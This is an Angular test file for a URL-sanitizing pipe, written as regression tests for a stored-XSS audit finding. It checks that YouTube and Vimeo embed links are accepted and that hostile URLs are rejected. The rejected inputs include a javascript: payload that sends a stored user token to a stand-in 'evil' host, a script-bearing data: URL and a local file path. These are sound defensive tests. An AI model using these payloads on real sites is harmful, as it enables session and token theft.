import { TestBed } from '@angular/core/testing';
import { DomSanitizer } from '@angular/platform-browser';
import { SafeEmbedUrlPipe, toAllowedEmbedUrl } from './safe-embed-url.pipe';

/** Regression tests for audit finding F-01 (stored XSS through formation.videoUrl). */
describe('SafeEmbedUrlPipe', () => {
  it('accepts allow-listed HTTPS embed URLs', () => {
    expect(toAllowedEmbedUrl('https://www.youtube.com/embed/dQw4w9WgXcQ')).toBe('https://www.youtube.com/embed/dQw4w9WgXcQ');
    expect(toAllowedEmbedUrl('https://www.youtube-nocookie.com/embed/abc?start=3')).not.toBeNull();
    expect(toAllowedEmbedUrl('https://player.vimeo.com/video/76979871')).not.toBeNull();
  });

  [
    "javascript:fetch('//evil/?t='+localStorage.userToken)",
    'JAVASCRIPT:alert(1)',
    ' javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'file:///C:/Windows/win.ini',
    'blob:https://www.youtube.com/abc',
    'http://www.youtube.com/embed/abc',
    'https://evil.com/embed/abc',
    'https://www.youtube.com.evil.com/embed/abc',
    'https://user:pass@www.youtube.com/embed/abc',
    'https://www.youtube.com:8443/embed/abc',
    'https://www.youtube.com/watch?v=abc',
    'https://www.youtube.com/embed/',
    'https://www.youtube.com/embed/../redirect?q=https://evil.com',
    '',
    null,
    undefined,
  ].forEach(url => {
    it(`rejects ${String(url)}`, () => {
      expect(toAllowedEmbedUrl(url)).toBeNull();
    });
  });

  it('returns null (so no iframe is rendered) for a dangerous URL', () => {
    TestBed.configureTestingModule({});
    const pipe = TestBed.runInInjectionContext(() => new SafeEmbedUrlPipe(TestBed.inject(DomSanitizer)));

    expect(pipe.transform('javascript:alert(1)')).toBeNull();
    expect(pipe.transform('https://www.youtube.com/embed/abc')).not.toBeNull();
  });
});
